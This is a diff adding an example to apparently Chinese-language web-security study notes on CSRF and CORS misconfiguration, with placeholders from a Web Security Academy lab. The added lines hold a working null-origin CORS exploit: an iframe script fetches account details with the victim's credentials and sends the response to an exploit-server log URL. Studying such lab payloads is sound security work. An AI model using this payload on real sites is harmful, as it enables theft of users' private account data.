@@ -18,6 +18,18 @@ CSRF使用HTML来构建请求，无需考虑同源策略，但请求数据内容
 
 The null origin：
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>*cors stuff here*</script>’></iframe>
+e.g.:
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+
 
 高级技巧：
 1.Client-Side cache poisoning： reflected XSS in a custom HTTP header --> CORS --> client-side caching
